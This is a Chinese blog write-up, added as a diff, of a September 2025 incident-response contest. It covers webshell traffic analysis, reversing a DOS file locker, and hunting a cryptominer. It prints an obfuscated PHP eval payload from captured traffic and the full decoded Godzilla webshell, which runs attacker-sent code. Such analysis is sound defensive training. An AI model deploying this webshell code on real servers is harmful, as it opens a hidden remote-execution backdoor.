@@ -1,0 +1,833 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fuk.png">
+  <link rel="icon" href="https://img.dkdun.cn/v1/2024/12/83e0272660805f52.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="butt3rf1y">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Wireshark查看流量包内容发现 1pass&#x3D;eval%28base64_decode%28strrev%28urldecode%28%27K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025年Solar应急响应公益月赛-9月">
+<meta property="og:url" content="http://example.com/2025/10/10/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-9%E6%9C%88/index.html">
+<meta property="og:site_name" content="(｡･ω･｡)Welcome~">
+<meta property="og:description" content="Wireshark查看流量包内容发现 1pass&#x3D;eval%28base64_decode%28strrev%28urldecode%28%27K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WS">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/38ea55dbce7a8e4f.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/c9a46f60adaf983a.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/c99181bfdf854fcd.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/5a6998bffdc2d847.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/8c5850344710c382.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/baa6212da15e8df0.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/dfdc24a567a7b984.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/d30860b70736d7db.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/36bbbd449ecc0bd8.png">
+<meta property="article:published_time" content="2025-10-10T07:54:33.000Z">
+<meta property="article:modified_time" content="2025-10-10T08:11:55.764Z">
+<meta property="article:author" content="butt3rf1y">
+<meta property="article:tag" content="应急响应">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img.dkdun.cn/v1/2025/12/38ea55dbce7a8e4f.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>2025年Solar应急响应公益月赛-9月 - (｡･ω･｡)Welcome~</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":true,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>butt3rf1y&#39;s Space</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://img.dkdun.cn/v1/2025/12/ee5d8516e3530463.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.1)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2025年Solar应急响应公益月赛-9月"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-10-10 15:54" pubdate>
+          2025年10月10日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          10 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+	<link rel="icon" href="https://img.dkdun.cn/v1/2024/12/e40f2f1a8320e35c.png" type="image/x-icon">
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2025年Solar应急响应公益月赛-9月</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年10月10日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h1><p>查看流量包内容发现</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">pass=<span class="hljs-keyword">eval</span>%<span class="hljs-number">28</span>base64_decode%<span class="hljs-number">28</span>strrev%<span class="hljs-number">28</span>urldecode%<span class="hljs-number">28</span>%<span class="hljs-number">27</span>K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7ciMhZ2MxImM2MzY0QjZmVGMn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cyYkV2M4N3dyoXYxFzJ9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B&amp;<span class="hljs-number">1</span>qaz2wsx3edc=eu1uNDRjMzYyYjz%<span class="hljs-number">2</span>Bu2uwAH1mNsWC9MvudxUD4GxD2vZHYhmcslPc4AT6kvwn72TiprEftRcyZvWaASZ2twUSoSXCZHZrgXp1OrZJTzbT5eJdLiAUCd1%<span class="hljs-number">2</span>BqUmpgl2Orlfucw%<span class="hljs-number">2</span>BsWVNIRc8GzsXv8ODt4jV5jXn%<span class="hljs-number">2</span>FLQCpCbmD2OihJd4HtL0BEOlzQGrMYUiFNRFgou2Zmus5JThj7ts0VATS5%<span class="hljs-number">2</span>FBmZjQ%<span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure>
+
+<p>解密 webshell 内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> base64<br><br>data = <span class="hljs-string">&quot;K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7ciMhZ2MxImM2MzY0QjZmVGMn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cyYkV2M4N3dyoXYxFzJ9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD&quot;</span><br>decoded = base64.b64decode(data[::-<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(decoded.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br></code></pre></td></tr></table></figure>
+
+<p>拿到的是哥斯拉流量</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php">@<span class="hljs-title function_ invoke__">session_start</span>();<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;1qaz2wsx3edc&#x27;</span>;<br><span class="hljs-variable">$payloadName</span>=<span class="hljs-string">&#x27;payload&#x27;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;0eff44c362b13fa2&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]))&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]),<span class="hljs-variable">$key</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]))&#123;<br>        <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>],<span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)===<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$payload</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">0</span>,<span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">encode</span>(@<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$data</span>),<span class="hljs-variable">$key</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">16</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>Cyber 解密</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/38ea55dbce7a8e4f.png"></p>
+<p>将密文提取出来 base64 解密</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;ccebdb78-<span class="hljs-number">4</span>b5c-<span class="hljs-number">4252</span>-b20a-<span class="hljs-number">0039913</span>c5c94&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><p>ida 看汇编流程</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcode">文件头写 <span class="hljs-string">&quot;ZX_LOCK&quot;</span> 和一个字节（取决于 word_<span class="hljs-number">1023</span>E &amp; <span class="hljs-number">1</span>）<br>获取系统时钟 <span class="hljs-comment">(int 1Ah)</span>，得到一个 seed <span class="hljs-comment">(di)</span><br>从 FLAG.TXT 读到 u<span class="hljs-symbol">nk_1012</span>A，对每两个字节执行一系列加密变换<br>把 seed <span class="hljs-comment">(word_1022A)</span> 和加密后的数据写入 FLAG.E<span class="hljs-symbol">NC</span><br></code></pre></td></tr></table></figure>
+
+<p>gpt 秒了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, seed: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br><br>    result = <span class="hljs-built_in">bytearray</span>()<br>    di = seed<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">2</span>):<br>        ax = <span class="hljs-built_in">int</span>.from_bytes(data[i:i+<span class="hljs-number">2</span>], <span class="hljs-string">&quot;little&quot;</span>)<br>        di = (di + <span class="hljs-number">0xFADE</span>) &amp; <span class="hljs-number">0xFFFF</span><br>        cx = ax &amp; di<br>        cx = (~cx) &amp; <span class="hljs-number">0xFFFF</span><br>        dx = ax &amp; cx<br>        dx = (~dx) &amp; <span class="hljs-number">0xFFFF</span><br>        tmp_ax = dx<br>        dx = di &amp; cx<br>        dx = (~dx) &amp; <span class="hljs-number">0xFFFF</span><br>        tmp_ax = tmp_ax &amp; dx<br>        tmp_ax = (~tmp_ax) &amp; <span class="hljs-number">0xFFFF</span><br>        result.extend(tmp_ax.to_bytes(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;little&quot;</span>))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(result)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_flag_enc</span>(<span class="hljs-params">filename=<span class="hljs-string">&quot;FLAG.ENC&quot;</span></span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        content = f.read()<br><br>    <span class="hljs-keyword">assert</span> content.startswith(<span class="hljs-string">b&quot;ZX_LOCK&quot;</span>)<br>    mode = content[<span class="hljs-number">7</span>]<br>    seed = <span class="hljs-built_in">int</span>.from_bytes(content[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>], <span class="hljs-string">&quot;little&quot;</span>)<br>    enc_data = content[<span class="hljs-number">10</span>:]<br><br>    dec = decrypt(enc_data, seed)<br><br>    <span class="hljs-keyword">if</span> mode == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> dec[-<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:<br>        dec = dec[:-<span class="hljs-number">1</span>]<br><br>    <span class="hljs-keyword">return</span> dec.decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    flag = parse_flag_enc(<span class="hljs-string">&quot;FLAG.ENC&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted FLAG:&quot;</span>, flag)<br></code></pre></td></tr></table></figure>
+
+<p>flag</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">flag&#123;D0s_L0ck3r_WitH_n4Nd_ExpRs!<span class="hljs-string">|solarsec_202509&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="特洛伊挖矿木马事件排查"><a href="#特洛伊挖矿木马事件排查" class="headerlink" title="特洛伊挖矿木马事件排查"></a>特洛伊挖矿木马事件排查</h1><h2 id="任务一"><a href="#任务一" class="headerlink" title="任务一"></a>任务一</h2><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">任务名称：提交挖矿文件的绝对路径</span><br><span class="language-xml">任务分数：100.00</span><br><span class="language-xml">任务类型：静态Flag</span><br><span class="language-xml">提交挖矿文件的绝对路径，最终以flag</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">xxx</span>/xxx&#125;</span><span class="language-xml">格式提交</span><br></code></pre></td></tr></table></figure>
+
+<p>查找 CPU 占用率顺序</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps aux --<span class="hljs-built_in">sort</span>=-%cpu | <span class="hljs-built_in">head</span> -20<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.dkdun.cn/v1/2025/12/c9a46f60adaf983a.png"></p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">tmp</span>/kworkerds&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="任务二"><a href="#任务二" class="headerlink" title="任务二"></a>任务二</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs armasm">任务名称：提交挖矿文件的外联<span class="hljs-built_in">IP</span>与端口<br>任务分数：<span class="hljs-number">100</span>.<span class="hljs-number">00</span><br>任务类型：静态Flag<br>提交挖矿文件的外联的<span class="hljs-built_in">IP</span>与端口，最终以flag&#123;<span class="hljs-built_in">ip</span>:port&#125;格式提交<br></code></pre></td></tr></table></figure>
+
+<p>根据 PID 查找外联</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/c99181bfdf854fcd.png"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">104.21.6.99:10235</span>&#125;<br></code></pre></td></tr></table></figure>
+
